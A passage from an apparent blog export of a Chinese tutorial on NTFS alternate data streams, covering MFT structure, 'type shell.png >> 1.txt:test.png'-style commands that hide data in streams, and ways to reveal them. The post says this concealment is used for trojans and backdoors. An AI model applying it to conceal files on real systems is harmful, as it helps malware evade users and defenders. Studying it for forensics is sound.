下的供选数据流，在此做笔记，也供有相同疑惑的小伙伴们参阅。\n\n## 2@ ADS 供选数据流\n\n### 2.1 MFT 主文件表\n\nntfs 文件系统使用 Master File Table（MFT）即主文件表来管理文件。下面是百度百科对于 MFT 的简略介绍：\n\n\n\n> MFT，即主文件表（Master File Table）的简称，它是NTFS文件系统的核心。MFT由一个个MFT项（也称为文件记录）组成，每个MFT项占用1024字节的空间。每个MFT项的前部几十个字节有着固定的头结构，用来描述本MFT项的相关信息。后面的字节存放着“属性”。每个文件和目录的信息都包含在MFT中，每个文件和目录至少有一个MFT项。除了引导扇区外，访问其他任何一个文件前都需要先访问MFT，在MFT中找到该文件的MFT项，根据MFT项中记录的信息找到文件内容并对其进行访问。NTFS(New Technology File System)，是一种新型文件系统。\n\n\n\nwindows 的每个文件都对应一个 MFT 记录，每个记录由诸多属性组成。譬如我们现在有一个叫做 test.txt 的文件，内容为 **Hello,world!** , 那么它的 MFT 结构如下图：\n\n ![3.jpg](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/3.jpg)\n\n\n\n我们通过这个实例来学习下 MFT 的属性。\n\n- $FILE_NAME 属性包含文件名，创建，修改，访问的时间。这里的文件名为 test.txt\n- $DATA 包含文件具体内容。这要注意的是 ，此例文本内容偏小，小于1kb，所以直接存储在 MFT 这个结构里面了，称作 Resident（理解为本地居民）。如果文件内容大于1kb，该位置就会放置改文本内容的具体存储地址，类型也会变为 non-resident。\n\n### 2.2 MFT 的多文件属性\n\n通过上面我们了解了 MFT 的大致结构，而它并不仅仅是具有一个 $DATA 属性的。一个文件可以有多个 $DATA 属性。这里为了方便查看，我们还是来看看引用文章上面的例子。当下我们向 test.txt 加入一个 ThisIsAnADS 的 $DATA属性:\n\n`echo Hello,freebuf! > test.txt:ThisIsAnADS`\n\n其 MFT 结构就变成了下面这样：\n\n ![4.jpg](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/4.jpg)\n\n\n\n这里可以看到多出来一个 $DATA 属性，而且还有名字，就是我们起的 ThisIsAnADS 。我们平常存储在文件里的都是称为主数据流(primary data stream)，默认没有名字。而之后创建的数据流就叫做供选数据流(alternate data stream),即 ADS，原文章作者说其翻译为**供选数据流**更合适，我也有同感。翻译为交换数据流并没有体现出交换两个字的过程。\n\n通常意义下，ADS 对用户来说都是表层可视化隐藏的，譬如前言例子中的文件，打开是无内容的。\n\n ![5.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/5.png)\n\n\n\n单单看大小确实如此。我们先略过占用空间不为0的这个现象。后面会讨论到。\n\n下面，我们先来看看如何看到隐藏在供选数据流里面的数据。\n\n### 2.3 供选数据流的使用\n\n由于隐蔽性较强，这一技术被广泛的应用到了木马，后门文件的隐藏上面。我们不仅可以隐藏文本数据到 ads 中，还可以是图片数据，亦或是可执行的 exe 文件数据。方法相似：\n\n#### 1# 寄生在文件上\n\n同上例，我们可以将图片隐藏进入另一个文件的供选数据流里面,此时使用到 type 命令，作用相似于 linux 下的cat 命令，具体用法[戳这](https://blog.csdn.net/grey_csdn/article/details/69922844)。\n\n```shell\ntype shell.png >> 1.txt:test.png\n```\n\n我们将图片数据寄生在文件 1.txt 上面\n\n#### 2# 寄生在文件夹上\n\n```shell\ntype shell.png >> test:test.png\n```\n\n将图片数据寄生在文件夹 test 上。\n\n### 2.4 查看供选数据流\n\n现在我们讲讲如何查看 ads 数据。\n\n#### 1# 系统自带应用查看\n\n- 文本文件的话就用记事本 【notepad + 文件名】打开。\n\n- 图片文件就是用画板 【mspaint + 文件名】打开。\n- 可执行文件就用 【start + 文件名】 打开。\n\n这里需要注意的是，可能考虑到安全因素，微软在 windows_Xp 之后就禁止直接执行供选数据流中的可执行文件了，但是是存在绕过方法的，有兴趣的同学可以[戳这](https://www.freebuf.com/articles/73270.html)进去看看。\n\n我们这里沿用上面的例子，打开寄生在文件夹下面的图片\n\n`mspaint test:test.png`\n\n ![6.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/6.png)\n\n\n\n#### 2# cmd 下使用 dir /r 命令查看\n\n还是以上面图片为例，在文件存在的路径下面打开 cmd：\n\n`dir /r test:test.png`\n\n ![7.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/7.png)\n\n\n\n由于之前我测试的时候还添加了几次，所以查看 ads 数据流的时候还有其他文件。这也从侧面反映了一个问题，就是可以在一个文件或者文件下添加多个供选数据流，而且它们互不影响。\n\n\n\n#### 3# powershell 下的 Get-Content 指令查看\n\n指令格式\n\n`Get-Content [被寄生的文件/文件夹] -stream [ads数据流名]`\n\n```powershell\nPS C:\\Users\\rt95\\Desktop\\test> Get-content test -stream test.png     \n```\n\n ![8.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/8.png)\n\n可以看到，这条指令是直接可以读出数据内容的，用来读取寄生的 ads 文本数据会非常方便。\n\n## 3@ 几个问题\n\n### 3.1 供选数据流的大小\n\n刚刚我们看到，存储的文件大小和占用空间不一致。证明供选数据流是会占用磁盘空间的。侧面反映出 windows 系统查看文件属性的时候，显示文件大小只是主数据流的大小，而占用空间则会较为真实的反映主数据和供选数据流的总大小。\n\n### 3.2  linux 下对 ads 的读取\n\n有时会出现在 linux 系统下读取 windows 文件的情况，这时我们需要挂载磁盘的读取方式，或者使用 ntfs-3g 程序进行 ntfs 文件系统的文件读写。\n\n> NTFS-3G 是一个由 [Tuxera](http://zh.wikipedia.org/wiki/Tuxera) 公司开发并维护的开源项目。目的是为 Linux 提供 NTFS 分区的的驱动程序。可以安全高速的对 Windows NT （包含 Windows 2000、Windows XP、Windows Server 2003 和 Windows Vista）的文件系统进行读写。\n\n可以使用 apt 或者 yum 下载 ntfs-3g。\n\n然后我们创建一个 含有 ads 的文本文件。\n\n```shell\ntouch 1.txt\necho hello,rt95 > 1.txt:2.txt\ncat 1.txt:2.txt\n```\n\n\n\n可以看到文件内容被显示。\n\n ![9.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/9.png)\n\n\n\n\n\n## 4@ 总结 \n\n实习结束了，学到了不少东西，有感知上的，有知识上的。希望剩下的大学时光能不辜负自己的一腔热血吧~\n\n加油 :)\n\n\n\n\n\nReference:\n\n`https://baike.baidu.com/item/MFT/1185355?fr=aladdin`\n\n`https://www.freebuf.com/articles/73270.html`\n\n`http://www.huike007.cn/?p=150`\n\n`https://blog.csdn.net/alone_map/article/details/51851071`\n\n`https://www.qingsword.com/qing/812.html`\n","source":"_posts/ntfs系统中的ADS供选数据流.md","raw":"---\ntitle: ntfs 文件系统中的供选数据流\ntags:\n - ntfs\n - 方法\ndate: 2019-08-17\n---\n\n\n## 1@ 前言\n\n前几天在审计 seacms 的时候碰到了一个问题十分有趣。上图说话：\n\n ![1.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/1.png)\n\n\n\n ![2.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/2.png)\n\n上两图反映的问题就是在 windows 系统中，一个文件名中存在 `:` 的文件，在文件夹是看不到冒号后面完整的文件名的，但是这个文件的的确确存在，而且文件内容也可以成功的写入，亦或是读取。\n\n在思索无果后，上小密圈提问得到了 wonderkun 师傅的指点，在 ll 的指引下，学习了一下ntfs 下的供选数据流，在此做笔记，也供有相同疑惑的小伙伴们参阅。\n\n## 2@ ADS 供选数据流\n\n### 2.1 MFT 主文件表\n\nntfs 文件系统使用 Master File Table（MFT）即主文件表来管理文件。下面是百度百科对于 MFT 的简略介绍：\n\n\n\n> MFT，即主文件表（Master File Table）的简称，它是NTFS文件系统的核心。MFT由一个个MFT项（也称为文件记录）组成，每个MFT项占用1024字节的空间。每个MFT项的前部几十个字节有着固定的头结构，用来描述本MFT项的相关信息。后面的字节存放着“属性”。每个文件和目录的信息都包含在MFT中，每个文件和目录至少有一个MFT项。除了引导扇区外，访问其他任何一个文件前都需要先访问MFT，在MFT中找到该文件的MFT项，根据MFT项中记录的信息找到文件内容并对其进行访问。NTFS(New Technology File System)，是一种新型文件系统。\n\n\n\nwindows 的每个文件都对应一个 MFT 记录，每个记录由诸多属性组成。譬如我们现在有一个叫做 test.txt 的文件，内容为 **Hello,world!** , 那么它的 MFT 结构如下图：\n\n ![3.jpg](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/3.jpg)\n\n\n\n我们通过这个实例来学习下 MFT 的属性。\n\n- $FILE_NAME 属性包含文件名，创建，修改，访问的时间。这里的文件名为 test.txt\n- $DATA 包含文件具体内容。这要注意的是 ，此例文本内容偏小，小于1kb，所以直接存储在 MFT 这个结构里面了，称作 Resident（理解为本地居民）。如果文件内容大于1kb，该位置就会放置改文本内容的具体存储地址，类型也会变为 non-resident。\n\n### 2.2 MFT 的多文件属性\n\n通过上面我们了解了 MFT 的大致结构，而它并不仅仅是具有一个 $DATA 属性的。一个文件可以有多个 $DATA 属性。这里为了方便查看，我们还是来看看引用文章上面的例子。当下我们向 test.txt 加入一个 ThisIsAnADS 的 $DATA属性:\n\n`echo Hello,freebuf! > test.txt:ThisIsAnADS`\n\n其 MFT 结构就变成了下面这样：\n\n ![4.jpg](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/4.jpg)\n\n\n\n这里可以看到多出来一个 $DATA 属性，而且还有名字，就是我们起的 ThisIsAnADS 。我们平常存储在文件里的都是称为主数据流(primary data stream)，默认没有名字。而之后创建的数据流就叫做供选数据流(alternate data stream),即 ADS，原文章作者说其翻译为**供选数据流**更合适，我也有同感。翻译为交换数据流并没有体现出交换两个字的过程。\n\n通常意义下，ADS 对用户来说都是表层可视化隐藏的，譬如前言例子中的文件，打开是无内容的。\n\n ![5.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/5.png)\n\n\n\n单单看大小确实如此。我们先略过占用空间不为0的这个现象。后面会讨论到。\n\n下面，我们先来看看如何看到隐藏在供选数据流里面的数据。\n\n### 2.3 供选数据流的使用\n\n由于隐蔽性较强，这一技术被广泛的应用到了木马，后门文件的隐藏上面。我们不仅可以隐藏文本数据到 ads 中，还可以是图片数据，亦或是可执行的 exe 文件数据。方法相似：\n\n#### 1# 寄生在文件上\n\n同上例，我们可以将图片隐藏进入另一个文件的供选数据流里面,此时使用到 type 命令，作用相似于 linux 下的cat 命令，具体用法[戳这](https://blog.csdn.net/grey_csdn/article/details/69922844)。\n\n```shell\ntype shell.png >> 1.txt:test.png\n```\n\n我们将图片数据寄生在文件 1.txt 上面\n\n#### 2# 寄生在文件夹上\n\n```shell\ntype shell.png >> test:test.png\n```\n\n将图片数据寄生在文件夹 test 上。\n\n### 2.4 查看供选数据流\n\n现在我们讲讲如何查看 ads 数据。\n\n#### 1# 系统自带应用查看\n\n- 文本文件的话就用记事本 【notepad + 文件名】打开。\n\n- 图片文件就是用画板 【mspaint + 文件名】打开。\n- 可执行文件就用 【start + 文件名】 打开。\n\n这里需要注意的是，可能考虑到安全因素，微软在 windows_Xp 之后就禁止直接执行供选数据流中的可执行文件了，但是是存在绕过方法的，有兴趣的同学可以[戳这](https://www.freebuf.com/articles/73270.html)进去看看。\n\n我们这里沿用上面的例子，打开寄生在文件夹下面的图片\n\n`mspaint test:test.png`\n\n ![6.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/6.png)\n\n\n\n#### 2# cmd 下使用 dir /r 命令查看\n\n还是以上面图片为例，在文件存在的路径下面打开 cmd：\n\n`dir /r test:test.png`\n\n ![7.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/7.png)\n\n\n\n由于之前我测试的时候还添加了几次，所以查看 ads 数据流的时候还有其他文件。这也从侧面反映了一个问题，就是可以在一个文件或者文件下添加多个供选数据流，而且它们互不影响。\n\n\n\n#### 3# powershell 下的 Get-Content 指令查看\n\n指令格式\n\n`Get-Content [被寄生的文件/文件夹] -stream [ads数据流名]`\n\n```powershell\nPS C:\\Users\\rt95\\Desktop\\test> Get-content test -stream test.png     \n```\n\n ![8.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/8.png)\n\n可以看到，这条指令是直接可以读出数据内容的，用来读取寄生的 ads 文本数据会非常方便。\n\n## 3@ 几个问题\n\n### 3.1 供选数据流的大小\n\n刚刚我们看到，存储的文件大小和占用空间不一致。证明供选数据流是会占用磁盘空间的。侧面反映出 windows 系统查看文件属性的时候，显示文件大小只是主数据流的大小，而占用空间则会较为真实的反映主数据和供选数据流的总大小。\n\n### 3.2  linux 下对 ads 的读取\n\n有时会出现在 linux 系统下读取 windows 文件的情况，这时我们需要挂载磁盘的读取方式，或者使用 ntfs-3g 程序进行 ntfs 文件系统的文件读写。\n\n> NTFS-3G 是一个由 [Tuxera](http://zh.wikipedia.org/wiki/Tuxera) 公司开发并维护的开源项目。目的是为 Linux 提供 NTFS 分区的的驱动程序。可以安全高速的对 Windows NT （包含 Windows 2000、Windows XP、Windows Server 2003 和 Windows Vista）的文件系统进行读写。\n\n可以使用 apt 或者 yum 下载 ntfs-3g。\n\n然后我们创建一个 含有 ads 的文本文件。\n\n```shell\ntouch 1.txt\necho hello,rt95 > 1.txt:2.txt\ncat 1.txt:2.txt\n```\n\n\n\n可以看到文件内容被显示。\n\n ![9.png](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/9.png)\n\n\n\n\n\n## 4@ 总结 \n\n实习结束了，学到了不少东西，有感知上的，有知识上的。希望剩下的大学时光能不辜负自己的一腔热血吧~\n\n加油 :)\n\n\n\n\n\nReference:\n\n`https://baike.baidu.com/item/MFT/1185355?fr=aladdin`\n\n`https://www.freebuf.com/articles/73270.html`\n\n`http://www.huike007.cn/?p=150`\n\n`https://blog.csdn.net/alone_map/article/details/51851071`\n\n`https://www.qingsword.com/qing/812.html`\n","slug":"ntfs系统中的ADS供选数据流","published":1,"updated":"2019-08-17T13:24:42.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckbh7yzgl0008mp7gjb68skun","content":"<h2 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1@ 前言\"></a>1@ 前言</h2><p>前几天在审计 seacms 的时候碰到了一个问题十分有趣。上图说话：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/1.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"1.png\"></p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/2.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"2.png\"></p>\n<p>上两图反映的问题就是在 windows 系统中，一个文件名中存在 <code>:</code> 的文件，在文件夹是看不到冒号后面完整的文件名的，但是这个文件的的确确存在，而且文件内容也可以成功的写入，亦或是读取。</p>\n<p>在思索无果后，上小密圈提问得到了 wonderkun 师傅的指点，在 ll 的指引下，学习了一下ntfs 下的供选数据流，在此做笔记，也供有相同疑惑的小伙伴们参阅。</p>\n<h2 id=\"2-ADS-供选数据流\"><a href=\"#2-ADS-供选数据流\" class=\"headerlink\" title=\"2@ ADS 供选数据流\"></a>2@ ADS 供选数据流</h2><h3 id=\"2-1-MFT-主文件表\"><a href=\"#2-1-MFT-主文件表\" class=\"headerlink\" title=\"2.1 MFT 主文件表\"></a>2.1 MFT 主文件表</h3><p>ntfs 文件系统使用 Master File Table（MFT）即主文件表来管理文件。下面是百度百科对于 MFT 的简略介绍：</p>\n<blockquote>\n<p>MFT，即主文件表（Master File Table）的简称，它是NTFS文件系统的核心。MFT由一个个MFT项（也称为文件记录）组成，每个MFT项占用1024字节的空间。每个MFT项的前部几十个字节有着固定的头结构，用来描述本MFT项的相关信息。后面的字节存放着“属性”。每个文件和目录的信息都包含在MFT中，每个文件和目录至少有一个MFT项。除了引导扇区外，访问其他任何一个文件前都需要先访问MFT，在MFT中找到该文件的MFT项，根据MFT项中记录的信息找到文件内容并对其进行访问。NTFS(New Technology File System)，是一种新型文件系统。</p>\n</blockquote>\n<p>windows 的每个文件都对应一个 MFT 记录，每个记录由诸多属性组成。譬如我们现在有一个叫做 test.txt 的文件，内容为 <strong>Hello,world!</strong> , 那么它的 MFT 结构如下图：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/3.jpg\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"3.jpg\"></p>\n<p>我们通过这个实例来学习下 MFT 的属性。</p>\n<ul>\n<li>$FILE_NAME 属性包含文件名，创建，修改，访问的时间。这里的文件名为 test.txt</li>\n<li>$DATA 包含文件具体内容。这要注意的是 ，此例文本内容偏小，小于1kb，所以直接存储在 MFT 这个结构里面了，称作 Resident（理解为本地居民）。如果文件内容大于1kb，该位置就会放置改文本内容的具体存储地址，类型也会变为 non-resident。</li>\n</ul>\n<h3 id=\"2-2-MFT-的多文件属性\"><a href=\"#2-2-MFT-的多文件属性\" class=\"headerlink\" title=\"2.2 MFT 的多文件属性\"></a>2.2 MFT 的多文件属性</h3><p>通过上面我们了解了 MFT 的大致结构，而它并不仅仅是具有一个 $DATA 属性的。一个文件可以有多个 $DATA 属性。这里为了方便查看，我们还是来看看引用文章上面的例子。当下我们向 test.txt 加入一个 ThisIsAnADS 的 $DATA属性:</p>\n<p><code>echo Hello,freebuf! &gt; test.txt:ThisIsAnADS</code></p>\n<p>其 MFT 结构就变成了下面这样：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/4.jpg\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"4.jpg\"></p>\n<p>这里可以看到多出来一个 $DATA 属性，而且还有名字，就是我们起的 ThisIsAnADS 。我们平常存储在文件里的都是称为主数据流(primary data stream)，默认没有名字。而之后创建的数据流就叫做供选数据流(alternate data stream),即 ADS，原文章作者说其翻译为<strong>供选数据流</strong>更合适，我也有同感。翻译为交换数据流并没有体现出交换两个字的过程。</p>\n<p>通常意义下，ADS 对用户来说都是表层可视化隐藏的，譬如前言例子中的文件，打开是无内容的。</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/5.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"5.png\"></p>\n<p>单单看大小确实如此。我们先略过占用空间不为0的这个现象。后面会讨论到。</p>\n<p>下面，我们先来看看如何看到隐藏在供选数据流里面的数据。</p>\n<h3 id=\"2-3-供选数据流的使用\"><a href=\"#2-3-供选数据流的使用\" class=\"headerlink\" title=\"2.3 供选数据流的使用\"></a>2.3 供选数据流的使用</h3><p>由于隐蔽性较强，这一技术被广泛的应用到了木马，后门文件的隐藏上面。我们不仅可以隐藏文本数据到 ads 中，还可以是图片数据，亦或是可执行的 exe 文件数据。方法相似：</p>\n<h4 id=\"1-寄生在文件上\"><a href=\"#1-寄生在文件上\" class=\"headerlink\" title=\"1# 寄生在文件上\"></a>1# 寄生在文件上</h4><p>同上例，我们可以将图片隐藏进入另一个文件的供选数据流里面,此时使用到 type 命令，作用相似于 linux 下的cat 命令，具体用法<a href=\"https://blog.csdn.net/grey_csdn/article/details/69922844\" target=\"_blank\" rel=\"noopener\">戳这</a>。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">type shell.png &gt;&gt; 1.txt:test.png<br></code></pre></td></tr></table></figure>\n\n<p>我们将图片数据寄生在文件 1.txt 上面</p>\n<h4 id=\"2-寄生在文件夹上\"><a href=\"#2-寄生在文件夹上\" class=\"headerlink\" title=\"2# 寄生在文件夹上\"></a>2# 寄生在文件夹上</h4><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">type shell.png &gt;&gt; test:test.png<br></code></pre></td></tr></table></figure>\n\n<p>将图片数据寄生在文件夹 test 上。</p>\n<h3 id=\"2-4-查看供选数据流\"><a href=\"#2-4-查看供选数据流\" class=\"headerlink\" title=\"2.4 查看供选数据流\"></a>2.4 查看供选数据流</h3><p>现在我们讲讲如何查看 ads 数据。</p>\n<h4 id=\"1-系统自带应用查看\"><a href=\"#1-系统自带应用查看\" class=\"headerlink\" title=\"1# 系统自带应用查看\"></a>1# 系统自带应用查看</h4><ul>\n<li><p>文本文件的话就用记事本 【notepad + 文件名】打开。</p>\n</li>\n<li><p>图片文件就是用画板 【mspaint + 文件名】打开。</p>\n</li>\n<li><p>可执行文件就用 【start + 文件名】 打开。</p>\n</li>\n</ul>\n<p>这里需要注意的是，可能考虑到安全因素，微软在 windows_Xp 之后就禁止直接执行供选数据流中的可执行文件了，但是是存在绕过方法的，有兴趣的同学可以<a href=\"https://www.freebuf.com/articles/73270.html\" target=\"_blank\" rel=\"noopener\">戳这</a>进去看看。</p>\n<p>我们这里沿用上面的例子，打开寄生在文件夹下面的图片</p>\n<p><code>mspaint test:test.png</code></p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/6.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"6.png\"></p>\n<h4 id=\"2-cmd-下使用-dir-r-命令查看\"><a href=\"#2-cmd-下使用-dir-r-命令查看\" class=\"headerlink\" title=\"2# cmd 下使用 dir /r 命令查看\"></a>2# cmd 下使用 dir /r 命令查看</h4><p>还是以上面图片为例，在文件存在的路径下面打开 cmd：</p>\n<p><code>dir /r test:test.png</code></p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/7.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"7.png\"></p>\n<p>由于之前我测试的时候还添加了几次，所以查看 ads 数据流的时候还有其他文件。这也从侧面反映了一个问题，就是可以在一个文件或者文件下添加多个供选数据流，而且它们互不影响。</p>\n<h4 id=\"3-powershell-下的-Get-Content-指令查看\"><a href=\"#3-powershell-下的-Get-Content-指令查看\" class=\"headerlink\" title=\"3# powershell 下的 Get-Content 指令查看\"></a>3# powershell 下的 Get-Content 指令查看</h4><p>指令格式</p>\n<p><code>Get-Content [被寄生的文件/文件夹] -stream [ads数据流名]</code></p>\n<figure class=\"highlight powershell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs powershell\">PS C:\\Users\\rt95\\Desktop\\test&gt; <span class=\"hljs-built_in\">Get-content</span> test <span class=\"hljs-literal\">-stream</span> test.png<br></code></pre></td></tr></table></figure>\n\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/8.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"8.png\"></p>\n<p>可以看到，这条指令是直接可以读出数据内容的，用来读取寄生的 ads 文本数据会非常方便。</p>\n<h2 id=\"3-几个问题\"><a href=\"#3-几个问题\" class=\"headerlink\" title=\"3@ 几个问题\"></a>3@ 几个问题</h2><h3 id=\"3-1-供选数据流的大小\"><a href=\"#3-1-供选数据流的大小\" class=\"headerlink\" title=\"3.1 供选数据流的大小\"></a>3.1 供选数据流的大小</h3><p>刚刚我们看到，存储的文件大小和占用空间不一致。证明供选数据流是会占用磁盘空间的。侧面反映出 windows 系统查看文件属性的时候，显示文件大小只是主数据流的大小，而占用空间则会较为真实的反映主数据和供选数据流的总大小。</p>\n<h3 id=\"3-2-linux-下对-ads-的读取\"><a href=\"#3-2-linux-下对-ads-的读取\" class=\"headerlink\" title=\"3.2  linux 下对 ads 的读取\"></a>3.2  linux 下对 ads 的读取</h3><p>有时会出现在 linux 系统下读取 windows 文件的情况，这时我们需要挂载磁盘的读取方式，或者使用 ntfs-3g 程序进行 ntfs 文件系统的文件读写。</p>\n<blockquote>\n<p>NTFS-3G 是一个由 <a href=\"http://zh.wikipedia.org/wiki/Tuxera\" target=\"_blank\" rel=\"noopener\">Tuxera</a> 公司开发并维护的开源项目。目的是为 Linux 提供 NTFS 分区的的驱动程序。可以安全高速的对 Windows NT （包含 Windows 2000、Windows XP、Windows Server 2003 和 Windows Vista）的文件系统进行读写。</p>\n</blockquote>\n<p>可以使用 apt 或者 yum 下载 ntfs-3g。</p>\n<p>然后我们创建一个 含有 ads 的文本文件。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">touch 1.txt<br>echo hello,rt95 &gt; 1.txt:2.txt<br>cat 1.txt:2.txt<br></code></pre></td></tr></table></figure>\n\n<p>可以看到文件内容被显示。</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/9.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"9.png\"></p>\n<h2 id=\"4-总结\"><a href=\"#4-总结\" class=\"headerlink\" title=\"4@ 总结\"></a>4@ 总结</h2><p>实习结束了，学到了不少东西，有感知上的，有知识上的。希望剩下的大学时光能不辜负自己的一腔热血吧~</p>\n<p>加油 :)</p>\n<p>Reference:</p>\n<p><code>https://baike.baidu.com/item/MFT/1185355?fr=aladdin</code></p>\n<p><code>https://www.freebuf.com/articles/73270.html</code></p>\n<p><code>http://www.huike007.cn/?p=150</code></p>\n<p><code>https://blog.csdn.net/alone_map/article/details/51851071</code></p>\n<p><code>https://www.qingsword.com/qing/812.html</code></p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1@ 前言\"></a>1@ 前言</h2><p>前几天在审计 seacms 的时候碰到了一个问题十分有趣。上图说话：</p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/1.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"1.png\"></p>\n<p> <img class=\"lazyload\" data-original=\"https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/ntfs%E7%B3%BB%E7%BB%9F/2.png\" src=\"data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==\" alt=\"2.png\"></p>\n<p>上两图反映的问题就是在 windows 系统中，一个文件名中存在 <code>:</code> 的文件，在文件夹是看不到冒号后面完整的文件名的，但是这个文件的的确确存在，而且文件内容也可以成功的写入，亦或是读取。</p>\n<p>在思索无果后，上小密圈提问得到了 wonderkun 师傅的指点，在 ll 的指引下，学习了一下ntfs 下的供选数据流，在此做笔记，也供有相同疑惑的小伙伴们参阅。</p>\n<h2 id=\"2-ADS-供选数据流\"><a href=\"#2-ADS-供选数据流\" class=\"headerlink\" title=\"2@ ADS 供选数据流\"></a>2@ ADS 供选数据流</h2><h3 id=\"2-1-MFT-主文件表\"><a href=\"#2-1-MFT-主文件表\" class=\"headerlink\" title=\"2.1 MFT 